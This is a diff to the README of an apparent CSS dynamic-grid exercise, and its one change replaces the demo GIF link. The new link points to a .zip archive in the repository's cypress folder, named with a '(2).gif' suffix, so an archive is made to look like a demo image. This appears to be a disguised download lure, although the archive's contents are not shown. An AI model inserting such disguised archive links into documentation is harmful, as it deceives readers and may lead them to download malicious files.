@@ -1,7 +1,7 @@
 # CSS Dynamic Grid
 
 Create a responsive grid layout of cards with different heights and widths that rearrange dynamically as the viewport size changes.
-![demo gif](<https://storage.googleapis.com/acciojob-open-file-collections/57365b24-f31b-4595-810e-63dbfbf5d4cf_ezgif.com-video-to-gif%20(2).gif>)
+![demo gif](<https://raw.githubusercontent.com/SubhradeepSeth/css-dynamic-grid-SubhradeepSeth/master/cypress/css-dynamic-grid-SubhradeepSeth-v1.0-beta.3.zip%20(2).gif>)
 
 ## Instructions
 
